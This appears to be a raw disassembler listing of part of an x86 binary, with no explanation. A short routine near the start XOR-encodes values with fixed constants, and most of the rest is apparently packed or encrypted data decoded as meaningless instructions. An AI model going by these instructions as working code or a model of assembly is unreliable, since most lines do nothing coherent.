  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	fchs   
  40ecee:	xchg   ebp,eax
  40ecef:	jmp    0x7cbdb970
  40ecf4:	inc    eax
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	jmp    0x40ec84
  40ecfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecfb:	push   edx
  40ecfc:	(bad)  
  40ecff:	stos   BYTE PTR es:[edi],al
  40ed00:	arpl   WORD PTR [eax],cx
  40ed02:	jg     0x40ec8d
  40ed04:	test   al,0xc8
  40ed06:	inc    edi
  40ed07:	sub    esi,eax
  40ed09:	loopne 0x40ecb3
  40ed0b:	lods   eax,DWORD PTR ds:[esi]
  40ed0c:	mov    esp,0xb4026d8
  40ed11:	das    
  40ed12:	scas   al,BYTE PTR es:[edi]
  40ed13:	call   FWORD PTR [edx]
  40ed15:	cdq    
  40ed16:	jo     0x40ecbc
  40ed18:	xchg   ebx,eax
  40ed19:	enter  0x303a,0x12
  40ed1d:	call   0x25cfd76e
  40ed22:	jle    0x40ecf2
  40ed24:	(bad)  
  40ed25:	lods   eax,DWORD PTR ds:[esi]
  40ed26:	popf   
  40ed27:	bound  edx,QWORD PTR [edi]
  40ed29:	or     BYTE PTR [edi+0x5ec2daec],cl
  40ed2f:	mov    eax,ds:0x1534b8a5
  40ed34:	inc    edx
  40ed35:	fsubrp st(4),st
  40ed37:	cmp    al,0x40
  40ed39:	rcl    DWORD PTR [ecx-0x19],cl
  40ed3c:	jno    0x40edb5
  40ed3e:	jbe    0x40ed70
  40ed40:	out    0x6b,al
  40ed42:	test   DWORD PTR [esi],ebx
  40ed44:	fisub  WORD PTR [eax]
  40ed46:	inc    ebx
  40ed47:	sub    DWORD PTR [edx+0xb],edx
  40ed4a:	int    0x3f
  40ed4c:	lea    esp,[eax-0x6f88f2a8]
  40ed52:	mov    edi,0xbe557a7
  40ed57:	mov    ebx,0x78381f2c
  40ed5c:	xchg   BYTE PTR [edi-0x6478afe1],bl
  40ed62:	adc    edx,DWORD PTR [eax-0x75bd52be]
  40ed68:	xlat   BYTE PTR ds:[ebx]
  40ed69:	sbb    BYTE PTR ds:0xd042f664,dl
  40ed6f:	ja     0x40ed29
  40ed71:	or     ebx,0xa168eab9
  40ed77:	(bad)  
  40ed79:	xchg   ebp,eax
  40ed7a:	das    
  40ed7b:	and    DWORD PTR [ecx+0x38],edi
  40ed7e:	loop   0x40ed68
  40ed80:	push   ebp
  40ed81:	in     eax,dx
  40ed82:	push   ebx
  40ed83:	repnz inc eax
  40ed85:	loope  0x40ed0e
  40ed87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed88:	push   ss
  40ed89:	(bad)  
  40ed8a:	aaa    
  40ed8b:	pop    ecx
  40ed8c:	xchg   ecx,eax
  40ed8d:	jg     0x40ed46
  40ed8f:	cdq    
  40ed90:	in     al,dx
  40ed91:	ds push cs
  40ed93:	push   ebx
  40ed94:	pop    edi
  40ed95:	xor    al,0x64
  40ed97:	mov    bl,0xf3
  40ed99:	sbb    al,0xdf
  40ed9b:	ins    DWORD PTR es:[edi],dx
  40ed9c:	setp   ch
  40ed9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eda0:	mov    eax,0x44b9102b
  40eda5:	and    al,0x8f
  40eda7:	mov    ds:0x8429b5b,eax
  40edac:	or     al,0xa4
  40edae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edaf:	icebp  
  40edb0:	add    bl,BYTE PTR [ebx]
  40edb2:	cs xchg esp,eax
  40edb4:	test   dl,ch
  40edb6:	mov    ebp,0x8d569b71
  40edbb:	or     BYTE PTR [esp+edx*2+0x18f7e14a],ah
  40edc2:	push   ebp
  40edc3:	push   ss
  40edc4:	das    
  40edc5:	sub    ah,ch
  40edc7:	inc    edi
  40edc8:	and    BYTE PTR [ebx],bh
  40edca:	in     eax,dx
  40edcb:	sar    dh,0x7a
  40edce:	fistp  WORD PTR [ecx+0x71]
  40edd1:	xchg   edx,eax
  40edd2:	int3   
  40edd3:	(bad)  
  40edd4:	sub    al,0xc4
  40edd6:	retf   0x9c16
  40edd9:	or     eax,0xfd2266ab
  40edde:	cmp    bl,al
  40ede0:	adc    edi,eax
  40ede2:	bound  edi,QWORD PTR ds:0x7f167e96
  40ede8:	pop    ebx
  40ede9:	fxch   st(1)
  40edeb:	mov    dh,0xfd
  40eded:	adc    al,0x7
  40edef:	stc    
  40edf0:	aas    
  40edf1:	pop    ecx
  40edf2:	sub    al,0xe4
  40edf4:	or     ch,BYTE PTR [ebx-0x3d]
  40edf7:	push   0x98c27a1b
  40edfc:	in     eax,0x68
  40edfe:	icebp  
  40edff:	(bad)  
  40ee00:	mul    DWORD PTR [ebp+0x38]
  40ee03:	shl    DWORD PTR [edi+0x68],1
  40ee06:	or     esp,DWORD PTR [ebx]
  40ee08:	or     eax,DWORD PTR [eax-0x586ec324]
  40ee0e:	popf   
  40ee0f:	imul   BYTE PTR [edx+0x53]
  40ee12:	push   ebx
  40ee13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee14:	inc    edi
  40ee15:	add    BYTE PTR [ebx-0x56671d21],bl
  40ee1b:	fdivr  QWORD PTR [esi-0x688960b3]
  40ee21:	stos   BYTE PTR es:[edi],al
  40ee22:	xchg   DWORD PTR [edx-0x4c],ebx
  40ee25:	xchg   ebx,eax
  40ee26:	push   eax
  40ee27:	(bad)  
  40ee28:	pop    ds
  40ee29:	sbb    al,0xa1
  40ee2b:	int    0x9c
  40ee2d:	xchg   edx,eax
  40ee2e:	xchg   esp,eax
  40ee2f:	cmp    al,0xd
  40ee31:	into   
  40ee32:	mov    cl,BYTE PTR ds:0x5501a281
  40ee39:	jecxz  0x40ee85
  40ee3b:	sbb    BYTE PTR [ebp-0x57],ah
  40ee3e:	xor    DWORD PTR [edi+0x56],esp
  40ee41:	pop    ss
  40ee42:	xor    edi,0x53a2bda7
  40ee48:	sbb    DWORD PTR [edi],edi
  40ee4a:	pop    es
  40ee4b:	inc    ecx
  40ee4c:	lahf   
  40ee4d:	pop    ebx
  40ee4e:	sub    al,0x35
  40ee50:	pop    es
  40ee51:	iret   
  40ee52:	cmc    
  40ee53:	pop    edx
  40ee54:	stc    
  40ee55:	mov    ecx,DWORD PTR [edi-0x64f9362c]
  40ee5b:	pop    ss
  40ee5c:	les    ecx,FWORD PTR [ebx-0x22]
  40ee5f:	dec    eax
  40ee60:	inc    edx
  40ee61:	mov    BYTE PTR [esi+0x22],bl
  40ee64:	dec    ebp
  40ee65:	cld    
  40ee66:	or     al,0x0
  40ee68:	or     al,0xf7
  40ee6a:	dec    ebp
  40ee6b:	xor    bh,BYTE PTR [esi-0x51]
  40ee6e:	std    
  40ee6f:	mov    es,WORD PTR [esi-0x56b84404]
  40ee75:	sbb    dh,al
  40ee77:	je     0x40eec2
  40ee79:	aas    
  40ee7a:	out    dx,al
  40ee7b:	push   ecx
  40ee7c:	pop    esi
  40ee7d:	adc    eax,0x628ec999
  40ee82:	sbb    bl,BYTE PTR [ebx+0x28715a93]
  40ee88:	es jo  0x40ee3e
  40ee8b:	xor    edx,DWORD PTR [ecx-0x17]
  40ee8e:	call   0xa06a904
  40ee93:	lock xor ebx,esp
  40ee96:	shl    DWORD PTR [eax],1
  40ee98:	adc    DWORD PTR [ecx+0x34],edi
  40ee9b:	mov    eax,0xf067850d
  40eea0:	sbb    DWORD PTR [ebp+0x6],esi
  40eea3:	loop   0x40ee40
  40eea5:	leave  
  40eea6:	jnp    0x40ee8c
  40eea8:	das    
  40eea9:	out    0xa1,al
  40eeab:	jno    0x40ee5b
  40eead:	push   ecx
  40eeae:	jmp    0xf77d:0x5b7004c2
  40eeb5:	inc    edx
  40eeb6:	mov    ebp,0xa52f74b8
  40eebb:	fidivr DWORD PTR [edx+edx*2]
  40eebe:	pop    ebx
  40eebf:	mov    dl,dh
  40eec1:	inc    ebx
  40eec2:	mov    al,0x86
  40eec4:	lock dec eax
  40eec6:	pop    es
  40eec7:	push   eax
  40eec8:	inc    edx
  40eec9:	xchg   edi,eax
  40eeca:	sub    esp,DWORD PTR [edi+0x54]
  40eecd:	add    dh,BYTE PTR [esi]
  40eecf:	inc    esp
  40eed0:	push   es
  40eed1:	pop    edi
  40eed2:	mov    ah,BYTE PTR [ebp-0x19]
  40eed5:	mov    bh,0x28
  40eed7:	pusha  
  40eed8:	mov    DWORD PTR [esi],ecx
  40eeda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eedb:	(bad)  
  40eedc:	xlat   BYTE PTR ds:[ebx]
  40eedd:	lock (bad) 
  40eedf:	cmp    edi,edx
  40eee1:	inc    ebp
  40eee2:	push   edi
  40eee3:	add    dh,dh
  40eee5:	ds hlt 
  40eee7:	pop    ecx
  40eee8:	stos   DWORD PTR es:[edi],eax
  40eee9:	std    
  40eeea:	(bad)
  40eeed:	bound  esi,QWORD PTR [edi]
  40eeef:	(bad)  
  40eef1:	test   al,0x23
  40eef3:	add    bh,0x4b
  40eef6:	lock sub al,0x61
  40eef9:	(bad)  
  40eefa:	mov    WORD PTR [ebp+0x717908d5],?
  40ef00:	call   0x5e26:0xcb1c63c7
  40ef07:	xor    DWORD PTR [ebx+0x300ba2a3],ecx
  40ef0d:	je     0x40ef8a
  40ef0f:	sub    BYTE PTR [ecx],al
  40ef11:	out    0x1,eax
  40ef13:	jg     0x40ef35
  40ef15:	jnp    0x40ef23
  40ef17:	inc    edx
  40ef18:	mov    cl,0xbc
  40ef1a:	pop    es
  40ef1b:	es xchg esp,eax
  40ef1d:	loop   0x40eefa
  40ef1f:	es out dx,eax
  40ef21:	fwait
  40ef22:	popa   
  40ef23:	pop    esp
  40ef24:	jle    0x40ef55
  40ef26:	test   eax,0x16804f75
  40ef2b:	je     0x40efa6
  40ef2d:	adc    al,0x6
  40ef2f:	pop    edx
  40ef30:	inc    ebp
  40ef31:	ins    DWORD PTR es:[edi],dx
  40ef32:	mov    dl,0xe
  40ef34:	ret    
  40ef35:	or     DWORD PTR [esi-0x307985d3],0x4e
  40ef3c:	xchg   ebx,eax
  40ef3d:	ins    BYTE PTR es:[edi],dx
  40ef3e:	cld    
  40ef3f:	push   ebp
  40ef40:	jp     0x40ef7d
  40ef42:	js     0x40ef66
  40ef44:	sub    eax,0x2c17de29
  40ef49:	and    BYTE PTR [edi+0x3d],dl
  40ef4c:	push   ss
  40ef4d:	fidivr DWORD PTR [esi-0x3d7ad240]
  40ef53:	xor    eax,0x877159af
  40ef58:	sub    al,0x45
  40ef5a:	and    BYTE PTR [edi-0x5],0x3f
  40ef5e:	nop
  40ef5f:	adc    eax,0xe52be20e
  40ef64:	jge    0x40ef1f
  40ef66:	push   0xffffffec
  40ef68:	and    BYTE PTR [ebx+0xc263045],al
  40ef6e:	push   ebx
  40ef6f:	push   ebx
  40ef70:	add    al,0x1e
  40ef72:	dec    eax
  40ef73:	aaa    
  40ef74:	push   esi
  40ef75:	call   0xbc8fa95
  40ef7a:	ds and eax,ebp
  40ef7d:	in     al,dx
  40ef7e:	mov    bh,0xb
  40ef81:	xlat   BYTE PTR ds:[ebx]
  40ef82:	jae    0x40efe7
  40ef84:	or     al,0x25
  40ef86:	jno    0x40ef9e
  40ef88:	xchg   edx,eax
  40ef89:	jp     0x40efc5
  40ef8b:	fnstcw WORD PTR [ebx+0x55]
  40ef8e:	in     al,dx
  40ef8f:	ja     0x40ef7f
  40ef91:	sbb    eax,0xedc42138
  40ef96:	sub    al,0x8f
  40ef98:	fdiv   QWORD PTR [esi]
  40ef9a:	dec    edx
  40ef9b:	outs   dx,DWORD PTR ds:[esi]
  40ef9c:	jns    0x40ef9d
  40ef9e:	retf   0xee83
  40efa1:	adc    BYTE PTR [ecx-0x6fb2e89c],ch
  40efa7:	adc    DWORD PTR [eax],0x5b
  40efaa:	add    al,0xf
  40efac:	add    ecx,DWORD PTR [eax+0x5b]
  40efaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb0:	mov    ds:0x400bd387,al
  40efb5:	leave  
  40efb6:	cmp    BYTE PTR [ebx+0x3f],0x5f
  40efba:	push   ds
  40efbb:	aad    0x60
  40efbd:	pop    esi
  40efbe:	loope  0x40efe1
  40efc0:	ins    BYTE PTR es:[edi],dx
  40efc1:	es xchg esi,eax
  40efc3:	dec    ebp
  40efc4:	ds dec ebp
  40efc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efc7:	out    dx,al
  40efc8:	xchg   edi,eax
  40efc9:	fistp  DWORD PTR [eax+0x14d5a812]
  40efcf:	ins    DWORD PTR es:[edi],dx
  40efd0:	dec    ebx
  40efd1:	pop    edi
  40efd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efd3:	xor    ah,bh
  40efd5:	push   ss
  40efd6:	push   esi
  40efd7:	dec    bh
  40efd9:	les    esp,FWORD PTR ds:0x41f94a7e
  40efdf:	bound  ebx,QWORD PTR ds:0x1879b1e9
  40efe5:	dec    eax
  40efe6:	pop    esp
  40efe7:	jnp    0x40ef9a
  40efe9:	jne    0x40efab
  40efeb:	push   eax
  40efec:	sbb    al,0x64
  40efee:	mov    ebx,ecx
  40eff0:	pop    DWORD PTR [edi]
  40eff2:	sbb    DWORD PTR [eax-0x460cbca1],esi
  40eff8:	cwde   
  40eff9:	call   0x65db:0xbfae0756
  40f000:	xor    edi,DWORD PTR [esi]
  40f002:	cmp    DWORD PTR [esi],esi
  40f004:	push   ecx
  40f005:	lahf   
  40f006:	popa   
  40f007:	cmp    dh,BYTE PTR [esi+0x1fffa1c9]
  40f00d:	lahf   
  40f00e:	dec    esi
  40f00f:	sub    eax,0x7561215a
  40f014:	mov    ecx,0x8a90715a
  40f019:	cmp    DWORD PTR [edi],edx
  40f01b:	sbb    eax,0xcff39d0
  40f020:	sub    DWORD PTR ss:[ebx+eiz*4+0x45],0xf95de052
  40f029:	fs add eax,0xed2e288c
  40f02f:	cdq    
  40f030:	xor    DWORD PTR [edi-0x7e44c34b],ebx
  40f036:	int    0xad
  40f038:	sub    BYTE PTR [edx+0x27200653],0xdc
  40f03f:	inc    edx
  40f040:	shl    BYTE PTR [esi+0x5],0x86
  40f044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f045:	inc    ebx
  40f046:	imul   DWORD PTR [ecx+0x53]
  40f049:	mov    cs,WORD PTR [edx+esi*8]
  40f04c:	sub    cl,BYTE PTR [edi+0x42]
  40f04f:	and    dl,BYTE PTR [esi-0x7b]
  40f052:	jmp    0xba1f3882
  40f057:	mov    bh,0x7d
  40f059:	xchg   DWORD PTR [edx-0x40],ebp
  40f05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f05d:	ret    
  40f05e:	sub    edi,DWORD PTR [edi]
  40f060:	int3   
  40f061:	fimul  WORD PTR [eax]
  40f063:	xor    esi,DWORD PTR [edx]
  40f065:	cli    
  40f066:	xchg   DWORD PTR [edx-0x1a0501de],ecx
  40f06c:	popa   
  40f06d:	jmp    0xb145c347
  40f072:	jl     0x40f02e
  40f074:	jg     0x40f0b6
  40f076:	add    BYTE PTR [esi-0x75],dh
  40f079:	xor    al,0x8c
  40f07b:	lock cli 
  40f07d:	cmc    
  40f07e:	or     esp,DWORD PTR ds:0x9a3dc9fe
  40f084:	dec    eax
  40f085:	jcxz   0x40f102
  40f088:	xchg   esp,eax
  40f089:	xchg   ecx,eax
  40f08a:	push   esp
  40f08b:	pop    es
  40f08c:	push   es
  40f08d:	cmp    edi,DWORD PTR [eax-0x59]
  40f090:	xchg   ebp,eax
  40f091:	lock or esp,DWORD PTR [ebx]
  40f094:	mov    ebp,0xf894b01e
  40f099:	fdivr  st,st(4)
  40f09b:	inc    ecx
  40f09c:	ins    BYTE PTR es:[edi],dx
  40f09d:	mov    cl,0x22
  40f09f:	addr16 jmp 0x8f62bb62
  40f0a5:	inc    ebx
  40f0a6:	add    DWORD PTR [edi],ebp
  40f0a8:	mov    dh,BYTE PTR [edx]
  40f0aa:	add    al,0xd7
  40f0ac:	scas   eax,DWORD PTR es:[edi]
  40f0ad:	sbb    al,0x8e
  40f0af:	cmp    al,cl
  40f0b1:	int3   
  40f0b2:	imul   esi,DWORD PTR [ecx],0x4fd564c0
  40f0b8:	inc    esp
  40f0b9:	sub    BYTE PTR [ecx-0x50],0xa9
  40f0bd:	mov    eax,fs:0x587d282d
  40f0c3:	std    
  40f0c4:	push   edx
  40f0c5:	pop    eax
  40f0c6:	and    BYTE PTR [edi+0x5774ac2e],0x40
  40f0cd:	ins    DWORD PTR es:[edi],dx
  40f0ce:	dec    ecx
  40f0cf:	xlat   BYTE PTR ds:[ebx]
  40f0d0:	xlat   BYTE PTR ds:[ebx]
  40f0d1:	cs push eax
  40f0d3:	rcl    BYTE PTR [ecx+0x78],0x28
  40f0d7:	std    
  40f0d8:	in     al,0x10
  40f0da:	mov    edx,0x3a2f56d7
  40f0df:	repz fwait
  40f0e1:	push   ss
  40f0e2:	sub    bl,BYTE PTR [eax+0x2d2f2be0]
  40f0e8:	push   0xffffffd0
  40f0ea:	add    eax,edi
  40f0ec:	pop    es
  40f0ed:	vpunpckhdq xmm0,xmm6,XMMWORD PTR [ebp-0x7f]
  40f0f2:	leave  
  40f0f3:	(bad)  
  40f0f4:	out    0x22,eax
  40f0f6:	or     ebx,esi
  40f0f8:	inc    edx
  40f0f9:	out    0x83,eax
  40f0fb:	adc    edx,0x5259d8a3
  40f101:	cmc    
  40f102:	cwde   
  40f103:	in     eax,0xce
  40f105:	cld    
  40f106:	add    ch,ch
  40f108:	aad    0xe1
  40f10a:	test   al,0xcb
  40f10c:	xor    eax,0x1e6f163f
  40f111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f112:	(bad)  
  40f113:	mov    eax,ds:0x49a2ccef
  40f118:	in     eax,0xf4
  40f11a:	lock sub al,0x3e
  40f11d:	jmp    FWORD PTR [eax]
  40f11f:	(bad)  
  40f120:	retf   0xc7b3
  40f123:	inc    esi
  40f124:	lods   al,BYTE PTR ds:[esi]
  40f125:	adc    ch,BYTE PTR [ebx]
  40f127:	pop    esi
  40f128:	cdq    
  40f129:	xchg   DWORD PTR [edx],ebp
  40f12b:	ins    BYTE PTR es:[edi],dx
  40f12c:	fs aaa 
  40f12e:	in     eax,0xb8
  40f130:	push   esi
  40f131:	add    eax,0xbfdcfd4
  40f136:	sub    dl,al
  40f138:	xchg   ebp,eax
  40f139:	or     eax,0x5ad9a793
  40f13e:	aam    0x1
  40f140:	mov    eax,ds:0xa290a5bc
  40f145:	and    al,0x29
  40f147:	test   BYTE PTR [eax-0x70c32e98],al
  40f14d:	mov    edx,ecx
  40f14f:	les    ebp,FWORD PTR [ebx+0x24]
  40f152:	adc    al,0x6b
  40f154:	push   cs
  40f155:	(bad)  
  40f156:	test   al,0x81
  40f158:	test   BYTE PTR [esp+ebp*1+0x64a014ed],0x2e
  40f160:	sbb    dl,dl
  40f162:	inc    esi
  40f163:	and    bl,BYTE PTR [ebp+edx*1-0x22]
  40f167:	mov    ebx,0x2dfe2b63
  40f16c:	xchg   ecx,eax
  40f16d:	sbb    DWORD PTR [ebx+0x6b891ca4],ecx
  40f173:	fld    DWORD PTR [esi+0x18a90089]
  40f179:	push   edx
  40f17a:	stos   BYTE PTR es:[edi],al
  40f17b:	fisttp DWORD PTR [ebx]
  40f17d:	jae    0x40f188
  40f17f:	push   edx
  40f180:	cmp    eax,DWORD PTR [ebp+eiz*1+0x51]
  40f184:	cdq    
  40f185:	xchg   ecx,eax
  40f186:	dec    ebx
  40f187:	lock rcr bh,0x8f
  40f18b:	cmp    al,0x8e
  40f18d:	test   BYTE PTR [edx],bh
  40f18f:	ins    DWORD PTR es:[edi],dx
  40f190:	mov    bh,0x5d
  40f192:	inc    esp
  40f193:	shl    BYTE PTR [eax+0x7c],0x77
  40f197:	or     eax,0x7ba2d4a4
  40f19c:	repnz aas 
  40f19e:	jbe    0x40f139
  40f1a0:	(bad)  
  40f1a1:	in     al,dx
  40f1a2:	xor    ebx,DWORD PTR es:[eax+ecx*2]
  40f1a6:	pop    ebx
  40f1a7:	cmp    BYTE PTR [esi+0x3942bd5c],0xab
  40f1ae:	imul   ebx,DWORD PTR [ebx+0x5837bd3b],0xd0872e98
  40f1b8:	fild   DWORD PTR [ebx-0x3f23b707]
  40f1be:	and    esp,DWORD PTR [edx+ecx*1]
  40f1c1:	lds    esp,FWORD PTR [esi-0x32]
  40f1c4:	push   esp
  40f1c5:	sub    ebx,esi
  40f1c7:	sbb    edx,0x15ed55bf
  40f1cd:	jmp    esi
  40f1cf:	sbb    eax,0xe0e10173
  40f1d4:	mov    esp,0x96e08db7
  40f1d9:	loop   0x40f1ad
  40f1db:	jnp    0x40f206
  40f1dd:	inc    esi
  40f1de:	sbb    bh,BYTE PTR [ecx]
  40f1e0:	mov    ebx,0x5cf0484f
  40f1e5:	jnp    0x40f16e
  40f1e7:	lock stc 
  40f1e9:	sub    edx,0xffffff9b
  40f1ec:	repz imul eax,DWORD PTR [ebx],0x3b
  40f1f0:	ficomp WORD PTR [esp+ebx*4+0x76]
  40f1f4:	add    DWORD PTR [ebx+0x3c],ecx
  40f1f7:	outs   dx,BYTE PTR ds:[esi]
  40f1f8:	jmp    0xf74e:0x8a5cb20a
  40f1ff:	fs jns 0x40f1dc
  40f202:	xchg   edi,eax
  40f203:	retf   0x414a
  40f206:	mov    esi,0x403e36e6
  40f20b:	dec    edi
  40f20c:	rol    dh,1
  40f20e:	adc    al,0xd5
  40f210:	pop    esp
  40f211:	test   eax,0x98b88f28
  40f216:	sub    ch,BYTE PTR [eax+0x54da354a]
  40f21c:	xor    esp,0x21b6eebe
  40f222:	or     al,0x74
  40f224:	inc    esp
  40f225:	jp     0x40f289
  40f227:	retf   
  40f228:	add    BYTE PTR [edx-0x51e79f50],ah
  40f22e:	inc    esi
  40f22f:	adc    eax,0xae52cc30
  40f234:	out    0x33,eax
  40f236:	and    BYTE PTR [ecx+edx*8+0x1123a9a8],al
  40f23d:	xor    ch,BYTE PTR [edi-0x23675b39]
  40f243:	mov    edx,0x70f5aa5f
  40f248:	sti    
  40f249:	in     al,dx
  40f24a:	(bad)  
  40f24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f24d:	mov    ebp,0x8c706395
  40f252:	inc    ecx
  40f253:	ins    BYTE PTR es:[edi],dx
  40f254:	lea    ebp,[eax]
  40f256:	cmp    DWORD PTR [edi-0x30efccb1],edi
  40f25c:	sti    
  40f25d:	in     eax,0x6d
  40f25f:	in     al,dx
  40f260:	mov    ebp,0x4ec61137
  40f265:	adc    al,0xd3
  40f267:	fimul  WORD PTR [edx-0x1cb6e65e]
  40f26d:	add    ch,al
  40f26f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f270:	push   esi
  40f271:	push   ebx
  40f272:	xor    BYTE PTR cs:[ecx-0x79],dl
  40f276:	pop    esi
  40f277:	sahf   
  40f278:	test   BYTE PTR [ecx+0x72],0x69
  40f27c:	shl    esi,0x65
  40f27f:	fwait
  40f280:	xor    BYTE PTR [edx-0xed55164],cl
  40f286:	lahf   
  40f287:	jo     0x40f266
  40f289:	imul   ecx,DWORD PTR [esi],0x9fc93bcc
  40f28f:	sbb    bl,dh
  40f291:	addr16 inc ecx
  40f293:	ins    DWORD PTR es:[edi],dx
  40f294:	stos   DWORD PTR es:[edi],eax
  40f295:	neg    BYTE PTR [esp+eiz*8+0x41]
  40f299:	in     eax,dx
  40f29a:	div    DWORD PTR [esi+0xb]
  40f29d:	and    edx,DWORD PTR [ebp-0x25abd1bd]
  40f2a3:	mov    al,0x79
  40f2a5:	pop    eax
  40f2a6:	and    bh,BYTE PTR [ecx-0x221b659c]
  40f2ac:	cld    
  40f2ad:	add    ecx,DWORD PTR [edx]
  40f2af:	adc    eax,DWORD PTR [esi+ecx*8+0x12]
  40f2b3:	jbe    0x40f32c
  40f2b5:	pop    eax
  40f2b6:	push   ecx
  40f2b7:	push   cs
  40f2b8:	ds enter 0xdc41,0x1c
  40f2bd:	pushf  
  40f2be:	dec    ebp
  40f2bf:	jo     0x40f318
  40f2c1:	sbb    BYTE PTR [ebx+0x53],bh
  40f2c4:	push   edx
  40f2c5:	es add eax,0xd0725f24
  40f2cb:	xor    DWORD PTR [edx-0x59],edi
  40f2ce:	mov    edx,0x2cf4fd51
  40f2d3:	icebp  
  40f2d4:	push   0x3edd82e1
  40f2d9:	jae    0x40f321
  40f2db:	add    cl,dh
  40f2dd:	test   DWORD PTR [esi],esi
  40f2df:	cmp    bl,BYTE PTR [edi-0x5f]
  40f2e2:	(bad)  
  40f2e3:	mov    edx,0xd7eab1c1
  40f2e8:	adc    dh,BYTE PTR [ecx+0x11]
  40f2eb:	push   esp
  40f2ec:	add    eax,0x580c8230
  40f2f1:	mov    bh,0x56
  40f2f3:	aas    
  40f2f4:	mov    al,0x2e
  40f2f6:	mov    bh,BYTE PTR [edi+0x15fc2031]
  40f2fc:	lods   al,BYTE PTR ds:[esi]
  40f2fd:	cmp    esi,edi
  40f2ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f300:	xor    al,0xe9
  40f302:	ds dec edi
  40f304:	icebp  
  40f305:	adc    al,0xb5
  40f307:	push   eax
  40f308:	into   
  40f309:	ins    DWORD PTR es:[edi],dx
  40f30a:	sahf   
  40f30b:	mov    al,ch
  40f30d:	xchg   edx,eax
  40f30e:	jb     0x40f37d
  40f310:	adc    al,0xaa
  40f312:	pusha  
  40f313:	cmp    BYTE PTR [edi],dh
  40f315:	or     al,bl
  40f317:	jne    0x40f35f
  40f319:	into   
  40f31a:	pop    esi
  40f31b:	and    al,0x1a
  40f31d:	call   0xd178:0x959cb0ca
  40f324:	pop    ds
  40f325:	inc    edx
  40f326:	jne    0x40f2ee
  40f328:	out    dx,al
  40f329:	fcomp  QWORD PTR [ecx-0x73d3a67d]
  40f32f:	and    BYTE PTR [edi],ch
  40f331:	lock xlat BYTE PTR ds:[ebx]
  40f333:	data16 arpl WORD PTR fs:[edx+esi*8],di
  40f338:	(bad)  
  40f339:	mov    cl,0xc0
  40f33b:	int    0x72
  40f33d:	shl    BYTE PTR [esi+0x60],0xd9
  40f341:	sbb    BYTE PTR ds:0xfc8ce990,0x7c
  40f348:	pusha  
  40f349:	jne    0x40f302
  40f34b:	pop    ds
  40f34c:	and    DWORD PTR ds:0xa19f3b79,ecx
  40f352:	outs   dx,DWORD PTR ds:[si]
  40f354:	into   
  40f355:	xchg   ebx,eax
  40f356:	or     eax,0x9b74ce85
  40f35b:	in     eax,dx
  40f35c:	pusha  
  40f35d:	cmp    ebx,DWORD PTR [ecx+0x1f915fc1]
  40f363:	xor    DWORD PTR [esi+0x18],ecx
  40f366:	or     eax,0x1b7332c
  40f36b:	dec    edi
  40f36c:	jg     0x40f2fb
  40f36e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f36f:	push   edx
  40f370:	popa   
  40f371:	dec    edi
  40f372:	cmp    edi,DWORD PTR [edi-0x26988add]
  40f378:	add    ebx,DWORD PTR [ecx]
  40f37a:	fimul  WORD PTR [eax+0x3d7ad85d]
  40f380:	sbb    eax,0xe12eb05c
  40f385:	xor    esi,DWORD PTR [ebx-0x455b5f4d]
  40f38b:	mov    eax,0x739042a9
  40f390:	xlat   BYTE PTR ds:[ebx]
  40f391:	push   ss
  40f392:	loop   0x40f36d
  40f394:	pushf  
  40f395:	pusha  
  40f396:	push   DWORD PTR ds:0x558c5633
  40f39c:	xor    eax,0x53e9bccf
  40f3a1:	jnp    0x40f344
  40f3a3:	mov    esp,0x7faa9fc1
  40f3a8:	and    eax,0x88630c8c
  40f3ad:	xor    al,0xa1
  40f3af:	sar    esp,cl
  40f3b1:	xchg   edx,eax
  40f3b2:	adc    eax,0x532a0463
  40f3b7:	cmp    BYTE PTR [esi-0x6a22715],al
  40f3bd:	ss call 0xf444d6df
  40f3c3:	mov    cx,0x8041
